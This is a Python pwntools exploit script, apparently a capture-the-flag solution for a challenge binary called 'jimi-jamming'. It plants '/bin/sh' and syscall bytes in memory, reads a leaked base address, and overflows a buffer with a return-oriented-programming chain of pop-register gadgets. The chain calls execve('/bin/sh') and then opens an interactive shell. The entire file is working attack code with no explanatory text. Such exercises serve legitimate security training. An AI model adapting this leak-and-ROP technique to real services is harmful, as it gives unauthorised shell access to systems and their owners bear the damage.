from pwn import *

r = True

if r:
  p = remote('localhost', 9000)
else:
  p = process('jimi-jamming')
  context.terminal = "/bin/bash"
  # gdb.attach(p)

print(p.recvuntil('let you leave a key somewhere'))

p.send('/bin/sh\x00\x0f\x05')

p.recvuntil('key?')
p.send('0')

print(p.recvuntil("right here! "))

leak = p.recvline()
ROP_JAIL_BASE = int(leak.strip().lstrip('0x'), 16)
print("ROP_JAIL_BASE AT: " + hex(ROP_JAIL_BASE))
print("Leak was:" + leak)

bin_sh = ROP_JAIL_BASE

syscall = ROP_JAIL_BASE + 8

# 0x0000000000000dcf : pop rax ; ret
poprax = ROP_JAIL_BASE + 0x0000000000000dcf
# 0x0000000000000daf : pop rdi ; ret
poprdi = ROP_JAIL_BASE + 0x0000000000000daf
# 0x0000000000000d3f : pop rsi ; ret
poprsi = ROP_JAIL_BASE + 0x0000000000000d3f
# 0x00000000000007df : pop rdx ; ret
poprdx = ROP_JAIL_BASE + 0x00000000000007df

print(p.recvuntil("JIMI JAM JAIL\n"))

payload = p64(0) * 4
payload += p64(poprdi) + p64(bin_sh)
payload += p64(poprsi) + p64(0)
payload += p64(poprdx) + p64(0)
payload += p64(poprax) + p64(59) # execve
payload += p64(syscall)
payload += p64(0) * 3

p.send(payload)

p.interactive()